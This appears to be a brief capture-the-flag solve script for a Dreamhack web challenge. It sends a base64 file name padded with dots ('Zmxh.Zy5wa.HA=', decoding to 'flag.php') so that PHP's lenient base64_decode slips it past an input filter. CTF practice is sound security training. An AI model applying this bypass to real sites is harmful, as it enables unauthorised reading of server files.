

# function base64_decode(string $string, bool $strict = false): string|false

# If the strict parameter is set to true then the base64_decode() function will return false if the input contains character from outside the base64 alphabet. Otherwise invalid characters will be silently discarded.

from bs4 import BeautifulSoup
import requests


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:21129"
    req = requests.get(url+'/', {'file': 'Zmxh.Zy5wa.HA='})
    print(BeautifulSoup(req.content, 'html.parser').find_all('div')[1].text)
